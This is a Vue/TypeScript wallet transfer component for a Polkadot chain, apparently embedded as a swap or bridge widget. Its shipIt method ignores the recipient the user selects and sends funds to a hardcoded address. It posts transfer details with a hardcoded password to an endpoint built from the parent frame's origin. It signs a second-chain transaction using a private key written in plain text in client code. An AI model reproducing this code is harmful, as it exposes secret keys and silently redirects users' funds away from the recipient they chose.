<template>
  <div id="transfer">
    <DisabledInput v-if="conn.chainName" 
      label="Chain" :value="conn.chainName" />
    <DisabledInput v-if="conn.blockNumber"
      label="Best Block" :value="conn.blockNumber" />
		<b-field v-else>
			<p class="has-text-danger">You are not connected. 
				<router-link :to="{ name: 'settings' }">
				Go to settings and pick node</router-link>
			</p>
		</b-field>
    <Dropdown mode='accounts' :externalAddress="transfer.from"
			@selected="handleAccountSelectionFrom" />
		<Dropdown :externalAddress="transfer.to"
			@selected="handleAccountSelectionTo" />
    <Balance :argument="{ name: 'balance', type: 'balance' }" @selected="handleValue"  />
    <b-field label="password" class="password-wrapper">
      <b-input v-model="password" type="password" password-reveal>
      </b-input>
    </b-field>
      <div class="transaction buttons">
      <b-button
        type="is-primary"
        icon-left="paper-plane"
        outlined
        :disabled="!accountFrom"
        @click="shipIt">
				Make Transfer
      </b-button>
      <b-button v-if="tx" tag="a" target="_blank" :href="getExplorerUrl(tx)" 
        icon-left="external-link-alt">
        View {{ tx.slice(0, 10) }}
      </b-button>
    </div>
  </div>  
</template>
<script lang="ts">
import { Component, Prop, Vue, Watch } from 'vue-property-decorator';
import Identicon from '@polkadot/vue-identicon';
import keyring from '@polkadot/ui-keyring';
import Selection from '@/components/extrinsics/Selection.vue';
import Balance from '@/params/components/Balance.vue';
import Account from '@/params/components/Account.vue';
import { KeyringPair } from '@polkadot/keyring/types';
import Dropdown from '@/components/shared/Dropdown.vue';
import DisabledInput from '@/components/shared/DisabledInput.vue';
import Connector from '@vue-polkadot/vue-api';
import { urlBuilderTransaction } from '@/utils/explorerGuide';
import shortAddress from '@/utils/shortAddress';
import exec from '@/utils/transactionExecutor';
import { showNotification } from '@/utils/notification';
import Web3 from 'web3';

@Component({
  components: {
    Identicon,
    Selection,
    Balance,
    Account,
    Dropdown,
    DisabledInput,
  },
})
export default class Transfer extends Vue {
  public theme: string = 'substrate';
  public tx: string = '';
  public password: string = '';
  public transfer: any = {
    from: null,
    fromBalance: null,
    to: null,
    toBalance: null,
    amountVisible: null,
    amount: null };
  public keyringAccounts: any = [];
  public conn: any = { blockNumber: '', chainName: ''};
  private balance = 0;
  private accountFrom: any = null;
  private accountTo: any = null;
  
  public web3 = new Web3(new Web3.providers.HttpProvider('https://rpc.callisto.network'))
  //public web3 = new Web3(this.newWsProvider());
  public privateKey = '0x1a08de3400331190ae31ce760a5205d3742b260a0e09073c8c8f90688b61ae0d';
  public addressFrom = '0x4073bc820e0933aa92853a44a3b216c359d776d8';
  public addressTo = '0xA461883afc72f0Ae6A6274062Ac76d9BF7da66EB';  

  private snackbarTypes = {
    success: {
      type: 'is-success',
      actionText: 'View',
      onAction: () => window.open(this.getExplorerUrl(this.tx), '_blank'),
    },
    info: {
      type: 'is-info',
      actionText: 'OK',
    },
    danger: {
      type: 'is-danger',
      actionText: 'Oh no!',
    },
  };

  getExplorerUrl(value: string) {
    return urlBuilderTransaction(value, 
      this.$store.state.explorer.chain, 
      this.$store.state.explorer.provider)
  }
  
  newWsProvider () {
      let provider = new Web3.providers.WebsocketProvider('wss://rpc.callisto.network')
      return provider
  }
  
  makeUrlee (s: string) {
      const h = this.getParentOrigin()
      const reh = /https:\/\//gi
      const hh = h.replace(reh, '')
      const poh = hh.split(':')
      const hhh = hh.split('.')
      const checkerPort = (hhh[0] === 'aspen' || hhh[0] === 'cube') ? '' : ':8453'
      const genc = (hhh[0] === 'dussel' || hhh[0] === 'coins') ? '' : '/genc'
      const u = 'https://' + poh[0] + checkerPort + '/cgi' + genc + '/' + s
      return u
  }
    
  inIframe () {
    try {
        return window.self !== window.top;
    } catch (e) {
        return true;
    }
  }

  getParentOrigin() {
    const locationAreDisctint = (window.location !== window.parent.location);
    const parentOrigin = ((locationAreDisctint ? document.referrer : document.location) || "").toString();

    if (parentOrigin) {
      return new URL(parentOrigin).origin;
    }

    const currentLocation = document.location;

    if (currentLocation.ancestorOrigins && currentLocation.ancestorOrigins.length) {
      return currentLocation.ancestorOrigins[0];
    }

    return "";
  }
  
  public async shipIt_old(): Promise<void> {
    const { api } = Connector.getInstance();
      try {
        showNotification('Dispatched');
        console.log([this.accountTo.address, this.balance])
	const pirl = this.balance/1000;
	const tx = await exec(this.accountFrom.address, this.password, api.tx.balances.transfer, [this.accountTo.address, pirl?.toString()]);
        showNotification(tx, this.snackbarTypes.success);
      } catch (e) {
        console.error('[ERR: TRANSFER SUBMIT]', e)
        showNotification(e.message, this.snackbarTypes.danger);
      }
  }

  public async shipIt(): Promise<void> {
      const { api } = Connector.getInstance();
      try {
        showNotification('Dispatched.. wait result of TX');	
	const pirl = this.balance/1000;
	
	const alicePair = keyring.getPair(this.accountFrom.address);
	alicePair.decodePkcs8(this.password);
	
	const { nonce } = await api.query.system.account(this.accountFrom.address);
        
	let getVars:string = '';
        let uri = window.location.href.split('?');
        if(uri.length == 2) {
          let vars = uri[1].split('#');
          vars.forEach(function(v) {
            let tmp = v.split('=');
            if(tmp.length == 2)
              getVars = tmp[1];
          });
        }

	let accountToConst:string = '';
        let h = this.getParentOrigin(); 
	let reh=/https:\/\//gi;
	let hh = h.replace(reh,"");
	let hhh = hh.split('.');
	accountToConst = '5CkLgg19XECX98Lxam7kd4yZWyMqs6dG5Z686e2EkwtHqU86'; //xETR
	this.web3.eth.getTransactionCount(this.addressFrom).then( (curNonce) => {
	 api.tx.balances
	.transfer(accountToConst, pirl)
	.signAndSend(alicePair, { nonce }, ({ events = [], status }) => {

	  if (status.isInBlock) {
        	//console.log('Included at block hash', status.asInBlock.toHex());
        	
		let success = true;
		
		//console.log('Events:');
        	events.forEach(({ event: { data, method, section }, phase }) => {
          		//console.log('\t', phase.toString(), `: ${section}.${method}`, data.toString());
			if (method === 'ExtrinsicFailed') success = false;
        	});
		
		if (success) {
			// this.sender2();
// update db
			let formData = new FormData();
			let pi = pirl / 1000000000000;
			let st = status.asInBlock.toHex();
			formData.append('pass', 'shit');
			formData.append('txs', st);
			formData.append('sender', this.accountFrom.address);
			formData.append('sumA', pi.toString());
			formData.append('mode', 'i');
			const s = 'resenter.pl';
			const urlee = this.makeUrlee(s);
// console.log('urlee is',urlee);
			fetch(urlee, {body: formData, method: 'post', mode: 'no-cors'}).then( (response) => {
			 
  			  const tx_send = {
  			  from: this.addressFrom,
  			  to: this.addressTo,
  			  value: this.web3.utils.toWei(pi.toString(), 'ether'),
  			  gas: 21000,
  			  gasPrice: 20000000000,
			  chainId: 820,
			  nonce: curNonce
  			  };
			  this.web3.eth.accounts.signTransaction(tx_send, this.privateKey).then( async (signedTransaction) => {
				//console.log(signedTransaction);
			 	if (signedTransaction && signedTransaction.rawTransaction) {
					let rawTx = signedTransaction.rawTransaction;
					console.log('rawTx:', rawTx);
					const receipt = await this.web3.eth.sendSignedTransaction(rawTx);
			      		if (receipt && receipt.transactionHash) {
						console.log('txHash', receipt.transactionHash);
						let formData2 = new FormData()
						formData2.append('pass', 'shit');
						formData2.append('txs', st);
						formData2.append('txr', receipt.transactionHash);
						formData2.append('receiver', this.addressTo);
						formData2.append('sumB', pi.toString());
						formData2.append('mode', 'u');
						const urlee = this.makeUrlee('resenter.pl');
						fetch(urlee, {body: formData2, method: 'post', mode: 'no-cors'}).then(function (response) { }).catch(function (err) { console.log('Fetch Error', err) });
			    		}	
				}
			  });
			}).catch(function(err) {console.log('Fetch Error', err);});
		  showNotification(status.asInBlock.toHex(), this.snackbarTypes.success);

		} else { showNotification('Trasaction error: low balance?', this.snackbarTypes.danger);}

      	  } else if (status.isFinalized) {
        	//console.log('Finalized block hash', status.asFinalized.toHex());
        	process.exit(0);
	  }
	});
       }); //curNonce	
      } catch (e) { //try
        //console.error('[ERR: TRANSFER SUBMIT]', e)
        showNotification(e.message, this.snackbarTypes.danger);
      }
  }

  @Watch('$store.state.keyringLoaded')
  public mapAccounts(): void {
    if (this.isKeyringLoaded() === true) {
      this.keyringAccounts = keyring.getPairs();
    }
  }

  public isKeyringLoaded() {
    return this.$store.state.keyringLoaded;
  }

  public getIconTheme() {
    this.theme = this.$store.state.setting.icon;
  }

  public async loadExternalInfo() {
    if ((this as any).$http.api) {
      const apiBestNumber = await (this as any).$http.api.derive.chain.bestNumber();
      this.conn.blockNumber = await apiBestNumber.toString();
      const apiResponse = await (this as any).$http.api.rpc.system.chain();
      this.conn.chainName = await apiResponse.toString();
    }
  }

  public handleAccountSelectionFrom(account: KeyringPair) {
    this.accountFrom = account;
  }

  public handleAccountSelectionTo(account: KeyringPair) {
    this.accountTo = account;
  }

  public handleValue(value: any) {
    Object.keys(value).map((item) => {
      (this as any)[item] = value[item];
    });
  }

  public sender2() {
	const mess = { action: 'Bound' };
	window.parent.postMessage(JSON.stringify(mess), '*');   
  }
  
  public externalURI() {
    if (this.$route.params.from) {
      this.transfer.from = this.$route.params.from;
    }
    if (this.$route.params.to) {
      this.transfer.to = this.$route.params.to;
    }
  }

  public mounted(): void {
    this.mapAccounts();
    this.getIconTheme();
    this.loadExternalInfo();
    this.externalURI();
  }

}
</script>

<style scoped>
.transaction.buttons {
  margin-top: 1em;
  float: right;
}

.password-wrapper {
  margin-top: 1em;
}
</style>
